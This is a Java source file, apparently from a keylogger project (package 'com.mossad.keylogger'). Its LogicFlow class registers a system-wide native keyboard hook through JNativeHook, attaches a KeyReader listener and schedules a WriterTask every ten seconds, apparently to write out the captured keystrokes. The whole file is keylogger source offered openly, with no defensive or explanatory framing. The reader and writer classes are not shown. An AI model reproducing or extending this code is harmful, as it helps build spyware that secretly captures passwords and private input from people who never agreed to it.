package com.mossad.keylogger;

import com.mossad.keylogger.timer.WriterTask;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.Timer;

public class LogicFlow {

    private Timer timer;
    private WriterTask writerTask;
    private KeyReader keyReader;

    public LogicFlow(){
        timer = new Timer();
        keyReader = new KeyReader();
        writerTask = new WriterTask(keyReader);
    }

    public void execute () throws NativeHookException {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(keyReader);
        timer.schedule(writerTask,1000L,10000L);
    }
}


